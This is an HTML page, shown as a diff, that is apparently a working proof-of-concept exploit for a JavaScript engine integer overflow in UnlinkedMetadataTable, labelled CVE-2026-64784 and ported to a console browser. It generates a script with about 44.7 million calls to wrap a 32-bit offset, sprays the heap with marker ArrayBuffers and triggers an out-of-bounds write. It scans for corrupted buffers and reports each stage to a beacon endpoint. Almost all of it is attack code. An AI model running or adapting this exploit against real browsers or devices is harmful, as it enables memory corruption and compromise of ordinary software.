@@ -1,0 +1,188 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P1161 - MetadataTable Overflow Port (p141)</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0f;color:#c8c8d0;font:12px/1.5 'Courier New',monospace;padding:10px}
+h2{color:#00ff88;font-size:14px;margin:6px 0}
+#log{background:#12121a;border:1px solid #2a2a3a;border-radius:6px;padding:8px;margin:6px 0;
+max-height:75vh;overflow-y:auto;font-size:11px;white-space:pre-wrap;word-break:break-all}
+.ok{color:#00ff88}.err{color:#ff4466}.info{color:#44aaff}.warn{color:#ffaa00}
+.hit{color:#ff00ff;font-weight:bold}
+</style>
+</head><body>
+<h2>P1161 MetadataTable Overflow (CVE-2026-64784) — p141 port</h2>
+<div id="log"></div>
+<script>
+'use strict';
+var L=document.getElementById('log'),T0=Date.now();
+function log(m,c){var d=document.createElement('div');d.className=c||'';
+d.textContent='['+(((Date.now()-T0)/1000).toFixed(1))+'s] '+m;L.appendChild(d);L.scrollTop=1e6;}
+function B(tag,data){try{var u='/beacon.php?tag=P1161-'+encodeURIComponent(tag);
+if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+u+='&t='+Date.now();new Image().src=u;}catch(e){}}
+window.onerror=function(m,s,l){try{B('JSERR',m+'@'+l);}catch(e){}};
+
+/* ═══════════════════════════════════════════════════════════════════════
+   P1161: PORT of pastawithpesto p141 — UnlinkedMetadataTable overflow.
+
+   Bug (wk1200 source UnlinkedMetadataTable.cpp:99-164): finalize()
+   computes offset += N*96 as UNSIGNED 32-bit. At N=44,739,243:
+   N*96 = 0x100000020 -> wraps to 0x20 -> total=144 -> 16-bit table.
+   link() allocates ~144 bytes. finishCreation() then writes 96 bytes
+   per op_call starting at offset 112, advancing 96B per entry:
+   entry #0 = bytes 112-207 (64B OOB), entries 1+ sweep forward ~4.29GB.
+
+   Community device results: p141 SIGSEGV (sweep hits unmapped);
+   p142 COMPILED-OK then crash on call; p144 forward write confirmed;
+   p146 14 JSString headers corrupted (.length=81400) via worker
+   polling. Dead-end note: later variants OOM'd at 3.7GB AST.
+
+   OUR RUN (crash-resume stage machine):
+   0: build 171MB blob (11 chunks x 4M + rem 3,739,243 'a();' calls)
+   1: load via <script> blob URL (COMPILED-OK?)
+   2: spray 20k AB(128) markers + GC pauses
+   3: CALL (pre-advance stage; sweep SIGSEGV expected -> crash recorded)
+   If COMPILED + CALL-CRASH: overflow primitive LIVE on our console.
+   ═══════════════════════════════════════════════════════════════════════ */
+
+var STAGES=['run','callcrashed'];
+var stage=0;
+try{stage=parseInt(localStorage.getItem('p1161_stage')||'0');}catch(e){}
+var logPrev='';
+try{logPrev=localStorage.getItem('p1161_log')||'';}catch(e){}
+function slog(m){logPrev+=m+'\n';try{localStorage.setItem('p1161_log',logPrev.slice(-2000));}catch(e){}log(m,'info');}
+
+B('BOOT','stage='+stage+'/'+STAGES.length+'|'+STAGES[stage]);
+slog('=== BOOT stage='+stage+' ('+STAGES[stage]+') ===');
+
+var N_TARGET=44739243;
+var CHUNK=4000000;
+var CHUNKS=Math.floor(N_TARGET/CHUNK);
+var REM=N_TARGET-CHUNKS*CHUNK;
+
+function buildBlob(){
+  var t0=Date.now();
+  var parts=[];
+  parts.push('window.__v141fn=function(a){');
+  for(var c=0;c<CHUNKS;c++){
+    parts.push('a();'.repeat(CHUNK));
+    if(c%3===0){B('BLD','c='+c+'/'+CHUNKS+'|ms='+(Date.now()-t0));slog('BLD chunk '+c);}
+  }
+  if(REM>0)parts.push('a();'.repeat(REM));
+  parts.push('};window.__v141ok=true;');
+  var blobMs=Date.now()-t0;
+  B('BLOB','ms='+blobMs+'|parts='+parts.length);
+  var blob=new Blob(parts,{type:'application/javascript'});
+  parts=null;
+  return blob;
+}
+
+function loadBlob(blob){
+  var url=URL.createObjectURL(blob);
+  var sc=document.createElement('script');
+  sc.src=url;
+  var t0=Date.now();
+  sc.onload=function(){
+    var ok=!!window.__v141ok;
+    var hasFn=(typeof window.__v141fn==='function');
+    B('LOADED','ms='+(Date.now()-t0)+'|ok='+ok+'|hasFn='+hasFn);
+    slog('LOADED ok='+ok+' fn='+hasFn);
+    URL.revokeObjectURL(url);blob=null;
+    if(!hasFn){B('NOFN');return;}
+    /* GC pauses like p141, then spray + call IN THE SAME BOOT */
+    setTimeout(function(){
+      for(var g=0;g<30;g++){var tmp=new ArrayBuffer(4194304);tmp=null;}
+      var bufs=sprayHeap();
+      setTimeout(function(){triggerCall(bufs);},1000);
+    },2000);
+  };
+  sc.onerror=function(){
+    B('LOAD-ERR','ms='+(Date.now()-t0));
+    slog('LOAD-ERR');
+  };
+  document.head.appendChild(sc);
+}
+
+function sprayHeap(){
+  var bufs=[];
+  var SPRAY_COUNT=20000,SPRAY_SIZE=128,MARKER=0xDEAD0141;
+  for(var i=0;i<SPRAY_COUNT;i++){
+    var ab=new ArrayBuffer(SPRAY_SIZE);
+    var dv=new DataView(ab);
+    dv.setUint32(0,MARKER,true);
+    dv.setUint32(4,i,true);
+    dv.setUint32(8,SPRAY_SIZE,true);
+    bufs.push({ab:ab,dv:dv,idx:i});
+  }
+  window.__v141spray=bufs;
+  B('SPRAY','count='+bufs.length+'|MB='+Math.round(SPRAY_COUNT*SPRAY_SIZE/1048576));
+  slog('SPRAY '+bufs.length);
+  return bufs;
+}
+
+function triggerCall(bufs){
+  B('PRE-CALL','n='+N_TARGET);
+  /* pre-advance: if the sweep crashes the WebProcess, next boot records it */
+  try{localStorage.setItem('p1161_stage','1');}catch(e){}
+  B('CALLING','now');
+  var callCount=0;
+  try{
+    window.__v141fn(function(){
+      callCount++;
+      if(callCount===1){B('CB1','reached');}
+      if(callCount>=3)throw new Error('PSTOP141');
+    });
+    B('RET','cc='+callCount);
+  }catch(e){
+    B('CALL-ERR',e.constructor.name+':'+String(e.message||'').slice(0,80)+'|cc='+callCount);
+  }
+  /* scan (only reached if no crash) */
+  var corrupted=0;
+  for(var i=0;i<bufs.length;i++){
+    var b=bufs[i];
+    if(b.ab.byteLength!==128){corrupted++;continue;}
+    if(b.dv.getUint32(0,true)!==0xDEAD0141||b.dv.getUint32(4,true)!==i||b.dv.getUint32(8,true)!==128)corrupted++;
+  }
+  B('SCAN','corrupted='+corrupted+'/'+bufs.length);
+  slog('SCAN corrupted='+corrupted);
+  B('SURVIVED-CALL','cc='+callCount);
+  B('DONE','complete');
+  try{localStorage.removeItem('p1161_stage');}catch(e){}
+}
+
+/* stage machine */
+if(stage===0){
+  slog('building blob N='+N_TARGET);
+  B('START','N='+N_TARGET);
+  var blob=buildBlob();
+  if(!blob){B('ABORT','blob-failed');}
+  else{loadBlob(blob);}
+}else{
+  /* stage 1 = previous boot reached CALLING and died -> overflow sweep LIVE */
+  B('CALL-CRASHED','prev boot died at call|N='+N_TARGET);
+  slog('*** CALL CRASHED ON PREVIOUS BOOT — overflow sweep LIVE ***');
+  B('RESULT','CALL-CRASH');
+  B('DONE','call-crashed');
+  try{localStorage.removeItem('p1161_stage');}catch(e){}
+}
+
+/* auto-reload checker */
+(function(){
+  var cur='P1161-metadata-overflow-v2';
+  setTimeout(function check(){
+    try{
+      var x=new XMLHttpRequest();
+      x.open('GET','/reload.txt?c='+Date.now(),true);
+      x.onload=function(){
+        var t=(x.responseText||'').trim();
+        if(t&&t!==cur){location.reload(true);return;}
+        setTimeout(check,3000);};
+      x.onerror=function(){setTimeout(check,5000);};
+      x.send();
+    }catch(e){setTimeout(check,5000);}
+  },4000);
+})();
+</script>
+</body></html>
